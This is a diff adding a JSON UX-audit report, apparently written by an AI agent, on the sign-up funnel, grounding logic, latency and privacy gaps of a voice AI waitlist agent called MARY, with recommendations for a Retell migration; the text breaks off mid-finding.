@@ -1,0 +1,1237 @@
+{
+  "conversation": {
+    "summary": "I read the playbook (docs/mary-voice.md), the phase machine (src/lib/mary-prompt.server.ts), the grounding code, the turn runner and /api/turn. I sampled 4 live /api/turn calls (the budget was 4 and all 4 are used; exact requests and responses are in scratchpad/ux-audit/conversation/live-1..4.log). I also ran the repo's own grounding and repeat functions against edge cases (probe-logic.ts / probe-logic.out.json). Her tone, objection handling and pricing answer are good: live call 4 picked the Growth plan for two locations and said final details come with the invite. The weak point is the funnel itself. The only way to sign up needs business, industry and operations, then a pitch you can't skip, then a wrap question. Her email is asked for last. Someone who says \"I've only got a minute, put me on the list\" and gives an email still gets \"To finish, what's the business, roughly?\" (live call 3). If they leave, the outcome is \"declined\" and the end screen says \"No spot reserved\". Grounding, the part of MARY that is most her own, still lets invented values through: a made-up email domain, \"dental\" taken from \"a small practice\", and a guessed \"real estate\" accepted on \"You know, we mostly do cars\". Measured time to her first text was 2.4-7.6 s (before speech-to-text and text-to-speech), against an ~800 ms budget. Retell fixes silence, latency and the repeat machinery. The funnel, the grounding, the opener, the promises and the close are prompt and business logic that have to be carried into the Retell agent on purpose; ready-to-paste text is in scratchpad/ux-audit/conversation/proposed-prompt-edits.txt.",
+    "findings": [
+      {
+        "title": "No fast lane: a visitor who gives name + email and wants to leave cannot get a spot and is recorded as 'declined'",
+        "severity": "P0",
+        "area": "conversation",
+        "evidence": "Live call 3 (scratchpad/ux-audit/conversation/live-3.log): Person: \"I'm Dana. Look, I've only got a minute, can you just put me on the list? It's dana k at gmail dot com.\" -> MARY: \"Yes, Dana — I'll keep this quick; I've got danak at gmail dot com.\" / \"To finish, what's the business, roughly?\" (mode=rushed). Required fields include business/industry/operations: src/lib/mary-prompt.server.ts:90, gate text :131-133 ('even if they ask you to finish now'), complete gated :235, src/features/mary/conversation/text.ts:55. Leaving -> declined: mary-prompt.server.ts:119, :224-227. Probe: endingFor({declined:true, collected:{name,email}}) = \"declined\" (probe-logic.out.json). End screen for declined: text.ts:76-81 'No spot reserved'. Minimum after 'I've only got a minute': reveal reply + lanes reply + wrap reply = at least 3 more turns once business/industry/operations are in, plus 1-2 turns to get those.",
+        "user_impact": "The visitors most likely to leave (rushed people at the stand) hand over their email and still walk away told 'No spot reserved'. Their row lands as declined. Saying 'To finish' when 3-5 turns are left also breaks trust.",
+        "recommendation": "Make name + email the minimum sign-up. In mary-prompt.server.ts:90/217-218 and text.ts:55, set the required fields for `complete` to name+email, and flag the lead row as a partial profile when business/industry/operations are missing. Replace the gate text at :131-133 with: 'A spot is secured once you have their name and email… If they want to go and you have name and email: confirm the spot in one line and close. If you have no email yet: ask for it once, tied to the spot, then let them go.' In endingFor, 'leaving' with name+email present returns signed_up, not declined. Exact text in proposed-prompt-edits.txt section 2.",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Email is asked for last, after discovery, reveal and the lanes pitch, so anyone who drops mid-call leaves no contact",
+        "severity": "P1",
+        "area": "conversation",
+        "evidence": "Phase order: CONTACT is reached only after discoveryDone && revealed && lanesDone (src/lib/mary-prompt.server.ts:118-125). The spec's own worked example asks for email on MARY's 7th turn, after 5 person answers (docs/mary-voice.md:439-459). The reveal/lanes flags only count when 'Convert'/'Cultivate'/'Recover' were heard in full (src/features/mary/conversation/turn-runner.ts:167-170), so a cut-in pushes the email ask back further.",
+        "user_impact": "A partial row (lead-lifecycle.ts:219-235) from someone who leaves at turn 4 has a name and a business but no way to reach them. That is a lost lead even when the conversation went well.",
+        "recommendation": "Move the email ask to the peak. The REVEAL turn's followUp becomes 'That's the whole sign-up, by the way. Where should your invite go?' (mary-prompt.server.ts:121 and mary-voice.md section 5, dropping the rule 'Never followed immediately by an ask'). LANES comes after and is skipped when mode is rushed. In rushed or leaving mode, ask for the email right after the name. Proposed text in proposed-prompt-edits.txt section 3.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Visitors with no business (student, job-seeker, curious) can never join, contradicting the playbook",
+        "severity": "P1",
+        "area": "conversation",
+        "evidence": "docs/mary-voice.md:221-222: 'If they have no business at all… don't invent one, and still offer them the spot.' The prompt says the opposite: src/lib/mary-prompt.server.ts:119 'If they have no business at all… switch to EXIT… set declined true', and business/industry/operations are required for complete (:90, :235; text.ts:55).",
+        "user_impact": "Every event has curious visitors and job-seekers. The model gets two opposite instructions, so what happens depends on the model, and the code path always ends as declined. That is a lost sign-up and a confusing goodbye.",
+        "recommendation": "Follow the playbook: with name+email they get the spot (same change as the fast-lane finding). Change mary-prompt.server.ts:119 to 'If they have no business at all, say that's fine, skip discovery and the reveal, and hold their spot with their email.'",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Turn latency is 2.4-7.6 s to the first text, with no filler, and the fixed-content opener is generated by the LLM",
+        "severity": "P1",
+        "area": "conversation",
+        "evidence": "Live /api/turn timings (live-1..4.log), time to first 'say' / full turn: opener 4,638/5,806 ms; 'what is this' 2,655/4,325 ms; early leaver 2,356/3,662 ms; dump+price 7,617/9,728 ms. Excludes /api/transcribe before and TTS after. Causes: forceReasoning (src/routes/api/turn.ts:48-49), a 24-field schema whose followUp can only be spoken once the whole object is done (mary-prompt.server.ts:22-67; turn-runner.ts:155-157), an LLM-generated welcome (turn-runner.ts:52-54, mary-app.tsx:533), and only a 'thinking' orb in the meantime (turn-runner.ts:100). Budget: 'roughly 800 milliseconds before a conversation starts to feel slow' (https://webrtc.ventures/2026/09/voice-ai-latency-budget/, 2026-09-23). Once sheets are configured, experienceForTurn can add up to 900 ms on a cache miss (src/lib/mary-experience.server.ts:258-288).",
+        "user_impact": "4-8 s of silence after every answer, plus transcription and speech time. In a loud room people repeat themselves or walk off. The 4.6 s wait after tapping Start is the first impression.",
+        "recommendation": "Make the opener a fixed line, spoken the moment Start is tapped (pre-generate or cache its audio). For the typing path, which keeps /api/turn: drop forceReasoning or use a faster model for turns, and move the evidence fields behind say/followUp so followUp is final before the bookkeeping is written. In Retell, use a static begin_message (a dynamic opener also triggers the 10 s minimum charge, https://docs.retellai.com/accounts/billing-exceptions). Measure time to first audio, not Retell's claim: vendor figure ~600 ms, independent median TTFAB 1,740 ms (https://openbenchmarks.com/voice-agent-latency/retell).",
+        "effort": "M",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Grounding records business/industry values that the quoted words don't support ('dental' from 'a small practice')",
+        "severity": "P1",
+        "area": "conversation",
+        "evidence": "src/lib/mary-grounding.ts:328-336 only checks that the evidence quote occurs in the person's words, never that the value follows from it. Probe (probe-logic.out.json): userMessages ['I run a small practice.'], proposed industry 'dental', business 'Smile Dental Group', operations 'front desk calls every lead back by hand', all with evidence 'I run a small practice' -> all three accepted, rejected []. The vertical guard covers only real estate/finance words (mary-grounding.ts:129-154), while the playbook forbids guessing dental, auto, HVAC and staffing too (docs/mary-voice.md:217-218). No unit test covers this (tests/unit/grounding.test.ts).",
+        "user_impact": "The sheet and the reveal ('I've got your business…') can hold a business name and trade the person never said. That breaks the product's main promise that she only records what was said, in front of the prospect.",
+        "recommendation": "In the default case, also require the value to be supported: for business, at least 50% of the value's content tokens appear in the person's words; for industry, the head word or a mapped synonym appears in the person's words. Extend VERTICAL_VALUE to every vertical the playbook names. Add unit tests for these probe cases. For Retell Option B, add <field>_evidence params to save_lead and run groundCollected on the user lines of call.transcript, which every custom-function request includes (https://docs.retellai.com/build/single-multi-prompt/custom-function).",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Email grounding accepts an invented domain, and voice capture has no spell-and-confirm step",
+        "severity": "P1",
+        "area": "conversation",
+        "evidence": "src/lib/mary-grounding.ts:298-304: ok if the squashed user text contains just the local part (length >= 2). Probe: user said 'Sarah.' / 'Just use my work email.', model proposed 'sarah@gmail.com' -> accepted. Live call 3 turned 'dana k at gmail dot com' into 'danak@gmail.com' and moved straight on without asking whether it was right. Retell recommends reading back critical details and spelling them (Agent Handbook 'Echo Verification' / 'NATO Phonetic Alphabet', https://docs.retellai.com/build/agent-handbook).",
+        "user_impact": "A wrong or made-up address makes the lead unreachable even though the visitor did everything right, and nobody notices until launch mail bounces.",
+        "recommendation": "Drop the local-part-only branch (require the full address, or at least the domain too). Add to the email beat: 'Read it back in chunks and spell anything that isn't an ordinary word, then ask \"Did I get that right?\" (the one allowed confirmation question). If it's wrong twice, ask them to type it in the box.' Show an email input on screen during the email ask so speech-to-text is skipped entirely. In Retell, also enable Echo Verification.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Sideways replies count as 'yes' and confirm her guess, bypassing the real-estate guard",
+        "severity": "P1",
+        "area": "conversation",
+        "evidence": "AFFIRMATION_START includes 'you', 'basically', 'pretty', 'more', 'right', 'sure' (src/lib/mary-grounding.ts:15-44); isAffirmation only rejects on a negation word. Probe: 'You know, we mostly do cars', 'Basically we're a law firm', 'Pretty much the opposite, we do cars' and 'Right, we're a law firm' are all read as yes. With MARY's last line 'Let me guess — real estate…?', the reply 'You know, we mostly do cars' records industry 'real estate', because the affirmation exception at :210 overrides assumesVertical.",
+        "user_impact": "She confidently records the vertical the person just corrected, and then sells to it. This is the exact default-to-real-estate failure the guard was written to stop.",
+        "recommendation": "Treat those words as a yes only when the reply is 3 tokens or fewer, or has no other content nouns; otherwise treat it as an answer. Add the probe sentences to tests/unit/grounding.test.ts. In Retell, the same logic runs in the save_lead handler.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "She promises things nothing delivers: a 'confirmation' email and 'the request is with the team'",
+        "severity": "P1",
+        "area": "copy/trust",
+        "evidence": "Email ask: 'So I know where to send your early-access confirmation' (docs/mary-voice.md:193, :459, :509; mary-prompt.server.ts:125). Nothing sends email: no MailApp/GmailApp/sendEmail in docs/google-sheets/Code.gs or src. Callback final turn says 'the request is with the team' (mary-prompt.server.ts:112), and the close says 'we'll be in touch', both spoken before any save (turn-runner.ts:180-184 -> lead-lifecycle.ts:238-276). Live GET https://omnisuite.omnikom.io/api/lead returned {\"configured\":false} on 2026-09-26, so nothing reaches the team. The playbook's own rule 'Only say it's recorded after it actually saved' (mary-voice.md:338) is not enforced.",
+        "user_impact": "Visitors wait for a confirmation that never comes, and callback requesters are told a person has their number when it sits only in their own browser. The broken promise lands on the brand.",
+        "recommendation": "Change the ask to 'so your invite has somewhere to go' until a confirmation email exists (or add one in Apps Script on append). Speak the 'saved / with the team' line only after the sync answers saved. In Retell, the agent says it only after save_lead returns ok, and uses the position it returns.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "The opener is jargon, never says what the visitor gets or how long it takes, and doesn't match the landing preview",
+        "severity": "P1",
+        "area": "first words",
+        "evidence": "Live call 1: \"Hi there. I'm MARY, Omnikom's AI Revenue Concierge. OmniSuite is our AI and human revenue engine.\" / \"And what should I call you?\" The landing page previews a different opener, \"Hi, I'm MARY. Want first access to OmniSuite through the launch waitlist?\" (src/features/mary/ui/landing.tsx:9), and promises 'two minutes' (landing.tsx:139-140). The WELCOME instruction has no waitlist, benefit or time (mary-prompt.server.ts:116; mary-voice.md:276-297), yet DISCOVER says 'never mention the waitlist offer again' (:119). Live call 2 shows the natural next question: 'what is this exactly? What am I signing up for?'",
+        "user_impact": "The first 10 seconds spend the visitor's attention on category words and a name request before saying what they get. Visitors who expected the preview's line have to ask what this is, which costs a turn and some trust.",
+        "recommendation": "Use a fixed opener: say 'Hi, I'm MARY. I look after early access for OmniSuite, Omnikom's new revenue engine.' / followUp 'Two minutes with me and you're on the list. What should I call you?' Keep 3-4 variants and delete 'never mention the waitlist offer again'. In Retell this becomes begin_message (static, start_speaker agent).",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "The playbook's silence handling is unreachable, so a turn that ends on a statement can stall forever",
+        "severity": "P2",
+        "area": "turn-taking",
+        "evidence": "The playbook's 'Silence — \"Still with me? No rush.\"' (docs/mary-voice.md:403) never reaches the model: /api/turn runs only on user input (turn-runner.ts:57-72). The client nudges only when the mic is muted or unavailable (src/features/mary/mary-app.tsx:378-396: `if (stage !== \"call\" || (micLive && !micMuted)) return`). The reveal turn ends on a statement (live call 4 followUp: '…without a form—that's Convert.').",
+        "user_impact": "With a live mic in hold-to-talk, after a statement like the reveal, nothing tells the visitor it's their turn. Dead air until they guess or leave.",
+        "recommendation": "In Retell set reminder_trigger_ms ~8000, reminder_max_count 2 (defaults are 10 s and 1) and end_call_after_silence_ms ~45000 (default is 10 min) (https://docs.retellai.com/api-references/create-agent). Add reminder lines: first, restate the last question more simply; second, 'I'll hold your spot if you give me an email, or type it below'. If name+email are already captured, close as signed_up on silence. Until the swap, let the idle timer also fire with a live mic after 20 s of no hold.",
+        "effort": "S",
+        "retell": "solved_by_retell"
+      },
+      {
+        "title": "The prompt contradicts itself: reveal, drive rule, followUp null, word cap, and examples that can't happen at runtime",
+        "severity": "P2",
+        "area": "conversation",
+        "evidence": "REVEAL 'Do not ask for anything in this turn' (mary-prompt.server.ts:121) vs the drive rule 'every turn must END on one concrete move' (:160) vs 'followUp… is null only on a closing, exit or final callback turn' (:164) vs 'Or null when a reaction alone is right' (mary-voice.md:422-424). Word cap 'roughly 25 words for the whole turn' (mary-voice.md:426) vs live replies of 31 (call 2) and 33 words (call 4). Worked examples show MARY taking two turns in a row (mary-voice.md:455-459, 543-546), which the runner can't do. Phase is computed from the fields known before this turn (mary-prompt.server.ts:100-102), so the turn that completes discovery is told 'draw out what is still missing'; in live call 4 the model revealed anyway, against its instruction.",
+        "user_impact": "Each turn the model has to guess which rule wins, so behaviour differs from call to call: a reveal with or without a question, long turns in a loud room, discovery questions after everything is known.",
+        "recommendation": "Add REVEAL as an explicit exception to the drive rule. Make the cap hard (≤25 words, LANES ≤35) and check it in finishTurn. Rewrite the examples so every MARY turn follows a Person line. Add: 'If their last message supplies the last missing detail, act on the next phase now.' In Retell, split the phases into multi-prompt states with explicit transitions (https://docs.retellai.com/build/single-multi-prompt/write-multi-prompt).",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "The repeat detector flags normal short replies, costs an extra LLM call, and feeds a fake 'Person' complaint to the model",
+        "severity": "P2",
+        "area": "conversation",
+        "evidence": "isNearRepeat (src/features/mary/conversation/text.ts:33-48) divides by the shorter line. Probe: 'Good to meet you, Sarah.' after 'Hey — good to meet you. I'm MARY…' = repeat (this is the playbook's own example, mary-voice.md:439-443). So are 'Got it.', 'Fair.', \"You're all set.\" and \"I'll be quick.\" when an earlier line contains them. A flagged say is suppressed (turn-runner.ts:124) and triggers a second, non-streamed LLM call (:129-145; full turns measured at 3.7-9.7 s). The retry injects REPEAT_NUDGE as a user line, '(You just repeated yourself…)' (:35-36), which the prompt renders as 'Person:'. The followUp question itself is never checked for repeats.",
+        "user_impact": "Several extra seconds of silence on ordinary turns. She may apologise to the visitor for a complaint they never made. A real repeated question still gets through.",
+        "recommendation": "Only flag lines of 6+ words, and check followUp against earlier followUps. Pass the nudge as a system note in buildPrompt, not as a Person line. In Retell Option B this runner is gone; in Option A carry the fixed version.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "A rushed visitor still gets the full pitch, and a cut-in during the lanes pitch replays it",
+        "severity": "P2",
+        "area": "conversation",
+        "evidence": "Rushed mode only adds 'one short beat, get to the point' (mary-prompt.server.ts:143-147). LANES can't be skipped: CONTACT/WRAP need lanesDone (:122-125). lanesDone needs both words heard in full (turn-runner.ts:168-170), so an interruption during the pitch replays LANES next turn. The playbook asks for 'In a rush — compress everything… email only, close' (mary-voice.md:410-411) and 'I'm busy — two short turns to the end' (:384-385). The in-a-rush example (mary-voice.md:537-553) shows reveal and lanes as back-to-back MARY turns, which the runner can't do.",
+        "user_impact": "The people with the least patience hear the longest sales beat, sometimes twice. That is the moment they cut in or walk off.",
+        "recommendation": "Skip LANES when mode is rushed, or when a lanes line was already cut off once. Count it as done if either loop word was heard. The rushed path is name -> email -> one-line reveal -> close.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "The close doesn't confirm details back and gives no concrete next step or position",
+        "severity": "P2",
+        "area": "conversation",
+        "evidence": "WRAP only asks 'if they have questions or want you to finalise their spot' (mary-prompt.server.ts:128), with no recap. CLOSE is fixed: 'Thanks for signing up — we'll be in touch as soon as OmniSuite launches, a product by Omnikom.' (:127; mary-voice.md:312-314). The end screen already shows a position and 'Invitations go out in order of position' (text.ts:83-93; end-screen.tsx:91), but she never says them. Retell's prompt guide: 'Confirm understanding: Paraphrase important information back to the caller' (https://docs.retellai.com/build/prompt-engineering-guide).",
+        "user_impact": "The visitor leaves unsure what was recorded or what happens next. The last spoken words are a brand tagline instead of their spot.",
+        "recommendation": "WRAP becomes a one-line recap: name, business and the email read back, then 'Anything you want to ask before I lock it in?' CLOSE, after the save returns: 'You're in, {name} — number {position} on the list. Your invite comes to that email when early access opens.' Keep 'a product by Omnikom' on screen only. In Retell, save_lead returns the position (retell-migration.md step 5) and end_call fires after this line.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Porting the playbook as-is to Retell would raise per-minute cost and keep lines that assume the hold-to-talk button",
+        "severity": "P2",
+        "area": "conversation",
+        "evidence": "The system prompt is the whole playbook: 28,135 chars, ~7,000 tokens (docs/mary-voice.md via mary-prompt.server.ts:4,9), plus ~1k tokens of per-turn rules. Retell bills duration × (prompt tokens ÷ 4,000) above 4,000 tokens, and the count includes the transcript (https://docs.retellai.com/accounts/billing-exceptions), so every call starts at ≥1.75× billed duration and grows. Hold-button lines: mary-voice.md:3-4 and :343-344 ('ask them to hold the button'). The migration plan pulls post-call analysis fields industry/business (docs/architecture/retell-migration.md:97-99), which are ungrounded LLM extractions.",
+        "user_impact": "Higher running cost, MARY telling people to press a button that no longer exists, and invented industries coming back into the sheet from call analysis.",
+        "recommendation": "Port as a multi-prompt agent with a global prompt under 4,000 tokens. Move objection lines to per-state prompts and drop worked examples from the always-on context. Rewrite the hold-button lines. Name tools explicitly in the prompt, per Retell's guide: 'call save_lead as soon as name and email are confirmed…; call end_call after the close/exit/final callback line'. Use call_analyzed only for summary/outcome and never overwrite grounded fields. Before launch, run Retell LLM simulation cases for every scenario in these findings (https://docs.retellai.com/test/llm-simulation-testing).",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Her phone number is never offered when the email arrives before the email-ask step",
+        "severity": "P3",
+        "area": "conversation",
+        "evidence": "allCaptured leaves phone out (mary-prompt.server.ts:89-91). The email-ask phase (:124-125), the only place the phone is offered, is skipped once the email is in. Live call 3 captured the email in the first answer, so this visitor would go discovery -> reveal -> lanes -> WRAP without a phone offer. The playbook says phone is 'always offered' (mary-voice.md:144, :513-516).",
+        "user_impact": "Fewer callable leads for the sales team. Small, since phone is optional.",
+        "recommendation": "Offer the phone once as the followUp of the turn that confirms the email ('Number's optional — want to add one?'), whatever the phase.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      }
+    ]
+  },
+  "funnel": {
+    "summary": "I walked the live site (https://omnisuite.omnikom.io, the PR #1 build; its UI files are identical to PR #2) as an iPhone 13, an iPhone SE-sized screen and desktop Chrome, from the landing page through Start, the mic prompt (allowed, denied, and answered slowly), the first 30 seconds, turn-taking, a full sign-up, a decline and \"Type instead\". Every /api route was mocked except two live calls I made to measure real latency (1 /api/turn welcome and 1 /api/speech; the budget was 4). I never sent a POST to /api/lead and never sent a beacon. Screenshots, logs and scripts (funnel.mjs, tap-test.mjs, double-tap.mjs, slow-net.mjs) are in /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/funnel/ (\"shots/...\" below means that folder). Verdict: the landing page looks polished and makes the ask clear, but the funnel breaks at both ends. At the end, every visitor is told \"Early access confirmed\" with a position number that the code makes up, while the live lead store is not connected (GET /api/lead returns {\"configured\":false}) and no confirmation email exists anywhere. Along the way: MARY's first word comes about 4.6 s after the tap and her first question about 16-18 s after it; a natural tap on the big button during her greeting cuts her off and leaves the call silent; a denied mic leads to a dead end; tapping Start twice runs two welcomes; and there is no notice anywhere that the call is AI-processed or recorded, or how the data is used. Retell fixes the latency and the hold-button traps. It does not fix the lead, consent, denial, double-start or end-screen problems, and Retell's own terms of service and its record-everything default make the consent gap more urgent.",
+    "findings": [
+      {
+        "title": "End screen confirms a spot and shows a made-up position number while the live site stores no lead",
+        "severity": "P0",
+        "area": "end screen",
+        "evidence": "Live GET https://omnisuite.omnikom.io/api/lead -> {\"configured\":false} (2026-09-26). src/features/mary/conversation/lead-lifecycle.ts:125 (not configured -> sync 'local', position: entry.position) and :129 (falls back to the local number even when the sheet saves without a position); src/lib/waitlist-store.ts:122-126 (positionFor = 128 + hash % 640) and :134 (the position is set on the first save, before any email is known, so it is seeded from the session id). The same email sarah@brightpath.com got 'Early access position #327' on iPhone and '#156' on desktop: shots/convo-ios-22-end-full.png, shots/convo-desktop-21-end-settled.png. The copy 'EARLY ACCESS CONFIRMED / You're on the list / Invitations go out in order of position' comes from src/features/mary/conversation/text.ts:84-92. The row exists only in the visitor's own localStorage (log-convo-ios.json: keys ['omnisuite.waitlist.v1']).",
+        "user_impact": "Every visitor who finishes the call today is told they are confirmed with a queue number, but the owner never receives the lead, and the number changes every session. The funnel's single outcome is lost, and anyone who compares numbers or never hears back will stop trusting the product.",
+        "recommendation": "Short term: when result.sync is 'local' or 'failed', do not show 'confirmed' or a position. Show 'We couldn't save your spot, tap to retry / leave your email' and retry syncLead. Remove the positionFor fallback in lead-lifecycle.ts:125/129 and only show a position the server returned. Longer term: connect SHEETS_WEBAPP_URL (decision D2) and test one real lead end to end. With Retell, keep the rule that MARY never says a position unless save_lead returned one from the sheet.",
+        "effort": "S",
+        "retell": "independent"
+      },
+      {
+        "title": "A tap (not a hold) on the big green button during MARY's welcome cuts her off and leaves the call silent",
+        "severity": "P1",
+        "area": "first words",
+        "evidence": "tap-test.mjs on the live site (iPhone profile): a 120 ms tap 5 words into the welcome cut her to 'Hello. I'm MARY, Omnikom's …'. No follow-up question was spoken and nothing happened for the next 8 s (/api/speech count stayed at 1). Screenshot shots/tap-ios-after-tap-during-welcome.png. Code: press -> runner.interrupt() (src/features/mary/mary-app.tsx:184-191), and the follow-up is dropped (turn-runner.ts 'if (turn.followUp && !deps.isHeld())'). A hold shorter than MIN_HOLD_MS (300 ms) just calls onCancel -> waiting(), with no notice (src/features/mary/voice/hold-talk.ts:4,123-124; mary-app.tsx:175-179,196).",
+        "user_impact": "Tapping is the natural gesture on the screen's biggest control, which reads 'Hold to talk to MARY' while she speaks for about 10 s. Anyone who taps loses her name question and sees a half-finished sentence with no next step during the first 15 seconds.",
+        "recommendation": "Treat a hold shorter than 300 ms as 'no-op plus hint': do not interrupt her. Only call runner.interrupt() once the hold passes MIN_HOLD_MS, and flash 'Press and hold while you speak'. If she was cut off with no user text, resume or repeat her last question. Also show the button as 'MARY is talking…' (dimmed) until her turn ends.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "About 4.6 s of silence before MARY's first word and about 16-18 s before she asks anything",
+        "severity": "P1",
+        "area": "first words",
+        "evidence": "Live measurements (2 of the 4 allowed calls): /api/turn welcome first 'say' at 2.98 s, full turn at 4.15 s (turn-welcome.ndjson); /api/speech first audio at 1.28 s, 24-word line = 10.2 s of audio (speech-welcome.timing). Replayed with those delays in the browser: tap -> first word revealed +4.6 s on iPhone and desktop (log-voice-ios.json, log-voice-desktop.json). Welcome ends +14 s, then a 1.8 s silent gap while the follow-up is synthesised: the follow-up TTS is only requested after the first line ends (turn-runner.ts deliver followUp after wait(260); audio-engine.ts speak() fetches per line, no prefetch). The question 'And what should I call you?' is audible at +15.8 s (iPhone) and the 'your turn' cue appears at +18.4 s (desktop). The greeting is generated by the LLM on every call (turn-runner.ts welcome() -> /api/turn with forceReasoning in src/routes/api/turn.ts). Real iPhones add the permission sheet on top.",
+        "user_impact": "Visitors wait in silence ('…' on screen) for almost 5 s, then listen to a 10 s company description before being asked anything. This is the point where people bail or start tapping.",
+        "recommendation": "Now: play a pre-rendered greeting clip (static TTS of a short opener, cached) the moment the call screen opens, and fetch the first LLM turn in parallel. Shorten the welcome to about 5 s ('Hi, I'm MARY, OmniSuite's AI concierge. What should I call you?'). Request the follow-up TTS while the first line is still playing. With Retell: use a static 'Custom message' begin message and set begin_message_delay_ms to about 1000-1500. Retell staff (community thread, 2026-09-17) confirmed the first packet reaches the browser about 1250 ms after the agent starts talking, so without the delay the first word is clipped. Port the short opener into the Retell prompt.",
+        "effort": "M",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Mic denied: wrong generic message, a 'mic button' that doesn't exist, and a Hold button that silently does nothing",
+        "severity": "P1",
+        "area": "start/permission",
+        "evidence": "Runs deny-ios / deny-desktop (getUserMedia rejects NotAllowedError). The visible notice was 'I couldn't open the microphone. Tap the mic button to try again, or keep going by typing.' (log-deny-ios.json). The specific 'denied' copy from start() (mary-app.tsx:521) is overwritten by the hold recorder's raw DOMException (src/features/mary/voice/hold-recorder.ts:118 calls getUserMedia unwrapped -> mary-app.tsx:254 micMessage(error) -> reason 'unknown', text.ts:115). In the default hold mode there is no mic button (composer.tsx:230 renders it only when !holdMode). The Hold button stays the primary CTA and pressing it produces no visible change: shots/deny-desktop-11-deny-holding.png, shots/deny-ios-10-your-turn.png. The status line still says 'Hold the button while you talk'; MARY carries on as if she can hear them, and the idle nudge says 'you can talk to me' (text.ts:138).",
+        "user_impact": "Visitors who block the mic (or are in an in-app browser) get contradictory instructions and a button that does nothing. The typing fallback exists but is presented as secondary, so many will leave.",
+        "recommendation": "Wrap the recorder's getUserMedia with micFailureFrom / MicUnavailableError. On 'denied', switch the call to typing mode: hide the Hold button, focus the textarea, and show a card with per-browser steps (Safari: aA > Website Settings > Microphone > Allow; Chrome: lock icon > Microphone). Keep the permissions-change listener that already re-enables voice (mary-app.tsx:325-348). Have MARY say one line: 'Looks like I can't hear you, no problem, type below.' With Retell, mic denial fires onError and then onEnd, ending the session (docs.retellai.com/deploy/web-call), so catch it and continue the same conversation in the /api/turn text chat.",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "No notice that the call is recorded, transcribed or processed by third parties, and no privacy link",
+        "severity": "P1",
+        "area": "copy/trust",
+        "evidence": "grep over src/features, src/components and src/routes for privacy|terms|recorded|recording|consent: no user-facing hits. Landing text (log-landing-ios.json) is only 'Your AI Revenue Concierge. Talk to her for two minutes…'; the page has 0 links. The data actually captured: the full transcript, name, email, phone, userAgent, referrer and timezone go to the sheet (lead-sync.ts browserContext, lead-lifecycle.ts:52-78). Transcripts go to /api/reflect to create 'lessons' (mary-app.tsx:95-119). Partial transcripts are beaconed as 'abandoned' when the tab closes (lead-lifecycle.ts flush). Audio goes to the Lovable AI gateway (routes/api/transcribe.ts). Retell: data_storage_setting defaults to 'everything' (recordings + transcripts; docs.retellai.com/api-references/create-web-call, docs.retellai.com/accounts/privacy-disable). Retell ToS (updated 2026-06-01): 'If Customer enables call recording, Customer must disclose the recording … and obtain any consent required … before or at the start of the call', and calls may be used for model training unless opted out (retellai.com/legal/terms-of-service). EU AI Act Art. 50 transparency duties have applied since 2 Aug 2026 (labs.cloudsecurityalliance.org research note 2026-07-29; digital-strategy.ec.europa.eu FAQ). ElevenLabs requires its agents to show the recording notice 'immediately prior to any interaction' (elevenlabs.io/docs/eleven-agents/legal/disclosure-requirement).",
+        "user_impact": "Business visitors, the target audience, are asked for email and phone by a voice bot with no word on recording or data use. That hurts trust at the moment of commitment, and after the Retell switch it breaks the vendor's terms.",
+        "recommendation": "Add one line under the Start buttons, before any audio: 'MARY is an AI. Your conversation is transcribed and saved so our team can follow up; see Privacy.' Link to a short privacy page covering what is stored, where (sheet, AI providers), for how long, and how to delete it. Add the same notice to MARY's opener or to Retell's begin message (Retell's own recommendation). For Retell, choose data_storage_setting and data_storage_retention_days deliberately and opt out of training if you don't want it.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Tapping Start twice while the mic prompt is open starts two welcomes, and MARY asks the name twice",
+        "severity": "P1",
+        "area": "start/permission",
+        "evidence": "double-tap.mjs (desktop, mic prompt answered after 4 s, second click at +1.6 s): getUserMedia called 2x, /api/turn 2x, plus one /_serverFn maryTurn retry (a paid LLM call on the live site; mocked here), and the transcript shows 'Hello. I am MARY. / What should I call you? / What should I call you?' (shots/doubletap-desktop-result.png). During the wait the landing shows no pending state (shots/doubletap-desktop-waiting-for-permission.png). Cause: start() only checks stage === 'landing', and the stage stays 'landing' until after `await unlockAudio(); await primed` (src/features/mary/mary-app.tsx:508-534). The button has no disabled or loading state (src/features/mary/ui/landing.tsx:146-157). The first primed stream is overwritten, so the first mic is leaked.",
+        "user_impact": "Chrome's mic bubble is small and easy to miss, so a second click is likely. The visitor then gets a doubled, confusing greeting, possibly a stuck mic indicator, and the operator pays twice.",
+        "recommendation": "Set a 'starting' flag synchronously on the first tap (in the store or a ref), disable both CTAs and show 'Allow the microphone to talk to MARY…' next to the button while permission is pending. Make primeMicPermission share one in-flight promise. With Retell, the same guard must stop a second POST /api/retell/web-call, which would open two billed calls with two MARYs talking.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "No confirmation email and no way to fix misheard details: the visitor leaves with nothing",
+        "severity": "P1",
+        "area": "end screen",
